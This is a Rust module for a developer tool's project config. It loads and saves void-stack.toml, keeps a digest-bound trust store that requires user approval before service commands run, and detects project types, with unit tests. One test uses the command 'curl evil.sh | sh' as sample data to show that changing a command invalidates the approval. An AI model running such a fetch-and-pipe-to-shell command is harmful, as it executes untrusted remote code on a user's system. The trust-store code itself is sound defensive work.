use std::path::{Path, PathBuf};

use crate::error::{Result, VoidStackError};
use crate::model::Project;

const CONFIG_FILENAME: &str = "void-stack.toml";

/// Load a project config from a TOML file.
///
/// # Trust model
/// `void-stack.toml` is **trusted input**: service `command` strings are
/// executed verbatim via the platform shell (`sh -c` / `cmd /c`) when the
/// project starts. Never start services from a config you haven't reviewed —
/// see [`is_project_trusted`] / [`mark_project_trusted`] for the one-time
/// confirmation used by the launchers.
pub fn load_project(path: &Path) -> Result<Project> {
    let config_path = resolve_config_path(path);
    let content = std::fs::read_to_string(&config_path)
        .map_err(|_| VoidStackError::ConfigNotFound(config_path.display().to_string()))?;
    let project: Project = toml::from_str(&content)?;
    Ok(project)
}

/// Save a project config to a TOML file.
pub fn save_project(project: &Project, dir: &Path) -> Result<()> {
    let config_path = dir.join(CONFIG_FILENAME);
    let content = toml::to_string_pretty(project)
        .map_err(|e| VoidStackError::InvalidConfig(e.to_string()))?;
    std::fs::write(&config_path, content)?;
    Ok(())
}

/// Resolve where the config file is. Accepts either a directory or a file path.
fn resolve_config_path(path: &Path) -> PathBuf {
    if path.is_file() {
        path.to_path_buf()
    } else {
        path.join(CONFIG_FILENAME)
    }
}

/// User-private trust store: canonical project path → SHA-256 digest of the
/// approved service command set. Lives OUTSIDE the project tree so a cloned
/// repository can never ship its own approval, and the digest binds the
/// approval to the exact commands — editing void-stack.toml (or pulling a
/// change) re-prompts.
fn trust_store_path() -> PathBuf {
    // Test/CI override so suites never touch the user's real store.
    if let Ok(p) = std::env::var("VOID_STACK_TRUST_STORE") {
        return PathBuf::from(p);
    }
    dirs::config_dir()
        .unwrap_or_else(|| PathBuf::from("."))
        .join("void-stack")
        .join("trusted-projects.json")
}

fn trust_store_key(project_dir: &Path) -> String {
    std::fs::canonicalize(project_dir)
        .unwrap_or_else(|_| project_dir.to_path_buf())
        .to_string_lossy()
        .to_string()
}

/// Stable SHA-256 digest over the service command set (name, command,
/// working_dir, env vars), sorted so ordering changes don't re-prompt.
fn service_commands_digest(project: &Project) -> String {
    use sha2::{Digest, Sha256};
    let mut entries: Vec<String> = project
        .services
        .iter()
        .map(|s| {
            format!(
                "{}\x1f{}\x1f{}\x1f{:?}",
                s.name,
                s.command,
                s.working_dir.as_deref().unwrap_or(""),
                s.env_vars
            )
        })
        .collect();
    entries.sort();
    let mut hasher = Sha256::new();
    for e in &entries {
        hasher.update(e.as_bytes());
        hasher.update([0u8]);
    }
    format!("{:x}", hasher.finalize())
}

fn load_trust_store() -> std::collections::HashMap<String, String> {
    std::fs::read_to_string(trust_store_path())
        .ok()
        .and_then(|c| serde_json::from_str(&c).ok())
        .unwrap_or_default()
}

/// True when the user already confirmed this project's CURRENT service
/// commands. Approval is keyed by canonical path and bound to a digest of
/// the command set — any change to the commands invalidates it.
pub fn is_project_trusted(project_dir: &Path, project: &Project) -> bool {
    load_trust_store()
        .get(&trust_store_key(project_dir))
        .is_some_and(|digest| *digest == service_commands_digest(project))
}

/// Record the user's approval to execute this project's current service
/// commands. Stored in the user's config dir, never inside the project.
pub fn mark_project_trusted(project_dir: &Path, project: &Project) -> Result<()> {
    let mut store = load_trust_store();
    store.insert(
        trust_store_key(project_dir),
        service_commands_digest(project),
    );
    let path = trust_store_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&path, serde_json::to_string_pretty(&store)?)?;
    Ok(())
}

/// Re-key a trust approval when a project is renamed/moved. If the OLD
/// project (path + commands) was approved, the approval carries over to the
/// new path/commands — the move itself is mechanical, the commands the user
/// blessed are the same ones modulo rewritten working dirs. Anything not
/// previously approved stays unapproved. Returns true when an approval was
/// migrated.
pub fn rekey_trusted_project(
    old_dir: &Path,
    old_project: &Project,
    new_dir: &Path,
    new_project: &Project,
) -> Result<bool> {
    let mut store = load_trust_store();
    // The old dir typically no longer exists when re-keying (it was already
    // renamed), so canonicalization falls back to the raw path while the
    // stored key was canonical. Try both forms, plus canonical-parent+name.
    let mut candidates = vec![trust_store_key(old_dir)];
    candidates.push(old_dir.to_string_lossy().to_string());
    if let (Some(parent), Some(name)) = (old_dir.parent(), old_dir.file_name())
        && let Ok(canon_parent) = std::fs::canonicalize(parent)
    {
        candidates.push(canon_parent.join(name).to_string_lossy().to_string());
    }
    let old_digest = service_commands_digest(old_project);
    let Some(old_key) = candidates
        .into_iter()
        .find(|k| store.get(k).is_some_and(|d| *d == old_digest))
    else {
        return Ok(false);
    };
    store.remove(&old_key);
    store.insert(
        trust_store_key(new_dir),
        service_commands_digest(new_project),
    );
    let path = trust_store_path();
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(&path, serde_json::to_string_pretty(&store)?)?;
    Ok(true)
}

/// Auto-detect project type by inspecting files in the directory.
pub fn detect_project_type(path: &Path) -> crate::model::ProjectType {
    use crate::model::ProjectType;

    // Order matters: more specific manifests are checked first so that a
    // Phoenix project (root `mix.exs` + root `package.json` for assets
    // tooling) is correctly classified as Elixir and not Node. Same for
    // a Rust project that happens to ship a JS bundler config alongside
    // Cargo.toml.
    if path.join("Cargo.toml").exists() {
        ProjectType::Rust
    } else if path.join("mix.exs").exists() {
        ProjectType::Elixir
    } else if path.join("pubspec.yaml").exists() {
        ProjectType::Flutter
    } else if path.join("go.mod").exists() {
        ProjectType::Go
    } else if path.join("pyproject.toml").exists()
        || path.join("requirements.txt").exists()
        || path.join("setup.py").exists()
    {
        ProjectType::Python
    } else if path.join("package.json").exists() {
        ProjectType::Node
    } else if has_unreal_markers(path) {
        ProjectType::Unreal
    } else if path.join("docker-compose.yml").exists()
        || path.join("docker-compose.yaml").exists()
        || path.join("Dockerfile").exists()
    {
        ProjectType::Docker
    } else {
        ProjectType::Unknown
    }
}

/// Check whether a directory carries Unreal Engine / UEFN markers: any
/// `*.uproject` or `*.uplugin` file, or any `*.verse` source file at the
/// top level of the directory.
pub fn has_unreal_markers(dir: &Path) -> bool {
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return false,
    };
    entries.flatten().any(|entry| {
        let path = entry.path();
        path.is_file()
            && path
                .extension()
                .and_then(|e| e.to_str())
                .is_some_and(|ext| {
                    ext.eq_ignore_ascii_case("uproject")
                        || ext.eq_ignore_ascii_case("uplugin")
                        || ext.eq_ignore_ascii_case("verse")
                })
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::fs;
    use tempfile::tempdir;

    fn sample_toml() -> &'static str {
        r#"
name = "my-app"
description = "Test project"
path = "."

[[services]]
name = "backend"
command = "python manage.py runserver"
target = "wsl"

[[services]]
name = "frontend"
command = "npm run dev"
target = "windows"
"#
    }

    #[test]
    fn test_trust_digest_changes_with_commands() {
        let mut project = Project {
            name: "t".into(),
            path: "/tmp/t".into(),
            description: String::new(),
            project_type: None,
            tags: vec![],
            services: vec![crate::model::Service {
                name: "web".into(),
                command: "npm run dev".into(),
                target: crate::model::Target::native(),
                working_dir: None,
                enabled: true,
                env_vars: vec![],
                depends_on: vec![],
                docker: None,
            }],
            hooks: None,
        };
        let d1 = service_commands_digest(&project);
        project.services[0].command = "curl evil.sh | sh".into();
        let d2 = service_commands_digest(&project);
        assert_ne!(d1, d2, "editing a command must invalidate the approval");
    }

    #[test]
    fn test_trust_store_lives_outside_project_tree() {
        // A cloned repo must never be able to ship its own approval:
        // the store path is under the user config dir, not the project.
        let store = trust_store_path();
        assert!(
            !store.starts_with("/tmp") && store.to_string_lossy().contains("void-stack"),
            "unexpected trust store location: {}",
            store.display()
        );
    }

    #[test]
    fn test_load_project() {
        let dir = tempdir().unwrap();
        let config = dir.path().join(CONFIG_FILENAME);
        fs::write(&config, sample_toml()).unwrap();

        let project = load_project(dir.path()).unwrap();
        assert_eq!(project.name, "my-app");
        assert_eq!(project.services.len(), 2);
        assert_eq!(project.services[0].name, "backend");
        assert_eq!(project.services[1].target, crate::model::Target::Windows);
    }

    #[test]
    fn test_save_and_reload() {
        let dir = tempdir().unwrap();
        let config = dir.path().join(CONFIG_FILENAME);
        fs::write(&config, sample_toml()).unwrap();

        let project = load_project(dir.path()).unwrap();
        save_project(&project, dir.path()).unwrap();
        let reloaded = load_project(dir.path()).unwrap();

        assert_eq!(project.name, reloaded.name);
        assert_eq!(project.services.len(), reloaded.services.len());
    }

    #[test]
    fn test_detect_python() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("requirements.txt"), "flask").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Python
        );
    }

    #[test]
    fn test_detect_node() {
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Node
        );
    }

    #[test]
    fn test_detect_unknown() {
        let dir = tempdir().unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unknown
        );
    }

    #[test]
    fn test_detect_phoenix_with_root_package_json_picks_elixir() {
        // Regression for Bug 3: Phoenix projects often have a root
        // `package.json` for asset tooling alongside `mix.exs`. The
        // mix.exs marker is more specific (it's the canonical Elixir
        // project file) and must win.
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("mix.exs"),
            "defmodule App.MixProject do\nend\n",
        )
        .unwrap();
        fs::write(dir.path().join("package.json"), "{\"name\":\"app-assets\"}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Elixir
        );
    }

    #[test]
    fn test_detect_unreal_uproject() {
        // A `.uproject` file marks an Unreal Engine project.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyGame.uproject"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_uplugin() {
        // A `.uplugin` file (UEFN plugin projects) also marks Unreal.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyPlugin.uplugin"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_top_level_verse_file() {
        // Loose `.verse` sources at the top level (UEFN creative islands)
        // mark the project as Unreal even without a .uproject manifest.
        let dir = tempdir().unwrap();
        fs::write(
            dir.path().join("my_device.verse"),
            "using { /Fortnite.com/Devices }\n",
        )
        .unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_unreal_wins_over_docker_fallback() {
        // Unreal markers must be checked before the Docker fallback.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("MyGame.uproject"), "{}").unwrap();
        fs::write(dir.path().join("Dockerfile"), "FROM alpine\n").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Unreal
        );
    }

    #[test]
    fn test_detect_rust_wins_over_unreal_markers() {
        // More specific manifests keep priority: Cargo.toml stays Rust
        // even when a .verse file sits alongside it.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
        fs::write(dir.path().join("tool.verse"), "using { MyModule }\n").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Rust
        );
    }

    #[test]
    fn test_has_unreal_markers_ignores_subdirectories() {
        // Only top-level files count as markers; a nested .verse file in a
        // subdirectory does not make the root an Unreal project by itself.
        let dir = tempdir().unwrap();
        let sub = dir.path().join("Content");
        fs::create_dir(&sub).unwrap();
        fs::write(sub.join("device.verse"), "using { MyModule }\n").unwrap();
        assert!(!has_unreal_markers(dir.path()));
        assert!(has_unreal_markers(&sub));
    }

    #[test]
    fn test_detect_rust_with_root_package_json_picks_rust() {
        // Same rule for Rust workspaces that ship a JS bundler config.
        let dir = tempdir().unwrap();
        fs::write(dir.path().join("Cargo.toml"), "[package]\nname=\"x\"\n").unwrap();
        fs::write(dir.path().join("package.json"), "{}").unwrap();
        assert_eq!(
            detect_project_type(dir.path()),
            crate::model::ProjectType::Rust
        );
    }
}
